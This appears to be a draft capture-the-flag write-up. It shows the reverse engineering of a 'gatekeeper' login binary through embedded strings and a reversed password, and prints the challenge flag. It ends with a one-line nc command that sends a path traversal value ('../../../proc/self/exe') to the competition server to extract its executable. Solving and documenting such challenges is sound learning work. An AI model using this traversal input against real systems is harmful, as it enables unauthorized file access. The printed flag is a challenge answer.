# (Title TODO)

(Intro TODO)

## Gatekeeper

Only a file named `gatekeeper` is insize the ZIP attachment, what is it?

```
$ file gatekeeper
gatekeeper: ELF 64-bit LSB shared object, x86-64, [...], not stripped
$ ./gatekeeper
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
[ERROR] Login information missing
Usage: ./gatekeeper <username> <password>
```

It's usually a good idea to see what strings are embedded in the binary:

```
$ strings gatekeeper
[...]
 ~> Verifying.
0n3_W4rM
 ~> Incorrect username
zLl1ks_d4m_T0g_I
Correct!
[...]
$ ./gatekeeper 0n3_W4rM zLl1ks_d4m_T0g_I
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
 ~> Verifying.......ACCESS DENIED
 ~> Incorrect password
```

Finding the fishy strings weren't too hard, but they don't work. After staring
at the second string a few seconds, it reads `I got mad skills` backward. Is
that it?

```
$ ./gatekeeper 0n3_W4rM I_g0T_m4d_sk1lLz
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
 ~> Verifying.......Correct!
Welcome back!
CTF{I_g0T_m4d_sk1lLz}
```

Yep, that's it.

## Admin UI 2

```
$ echo -e "2\n../../../proc/self/exe\n3" | nc mngmnt-iface.ctfcompetition.com 1337 > data.bin
```
